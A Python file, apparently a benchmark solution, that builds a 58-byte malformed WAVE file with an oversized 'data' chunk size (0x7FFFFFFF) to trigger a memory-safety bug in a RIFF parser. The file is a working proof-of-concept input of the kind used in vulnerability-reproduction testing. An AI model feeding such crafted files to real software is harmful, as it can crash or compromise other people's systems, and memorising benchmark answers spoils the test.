class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a 58-byte Proof-of-Concept input that triggers a heap buffer
        overflow in a RIFF file parser.

        The PoC is a malformed WAVE file. It follows the general structure of a
        WAVE file but contains a 'data' chunk whose declared size is excessively
        large (0x7FFFFFFF). The vulnerability lies in the parser's failure to
        validate this size against the boundaries of the parent RIFF chunk,
        leading to an out-of-bounds read.

        The structure is crafted to match the ground-truth PoC length of 58 bytes,
        which suggests that the specific sequence of chunks ('fmt ' with an
        extended size, followed by a 'fact' chunk) is necessary to reach the
        vulnerable code path.

        PoC Structure:
        - RIFF Header (12 bytes): 'RIFF', FileSize (50), 'WAVE'
        - 'fmt ' chunk (26 bytes): 'fmt ', ChunkSize (18), Data (18 bytes)
        - 'fact' chunk (12 bytes): 'fact', ChunkSize (4), Data (4 bytes)
        - 'data' chunk header (8 bytes): 'data', ChunkSize (0x7FFFFFFF)
        """
        
        # RIFF Header: 12 bytes
        # Total file size is 58, so RIFF chunk size is 58 - 8 = 50.
        poc = b'RIFF' + (50).to_bytes(4, 'little') + b'WAVE'

        # 'fmt ' chunk: 26 bytes
        # Using an extended format with size 18.
        poc += b'fmt ' + (18).to_bytes(4, 'little') + (b'\x00' * 18)

        # 'fact' chunk: 12 bytes
        poc += b'fact' + (4).to_bytes(4, 'little') + (b'\x00' * 4)

        # 'data' chunk header: 8 bytes
        # Malicious size to trigger the out-of-bounds read.
        poc += b'data' + (0x7FFFFFFF).to_bytes(4, 'little')
        
        return poc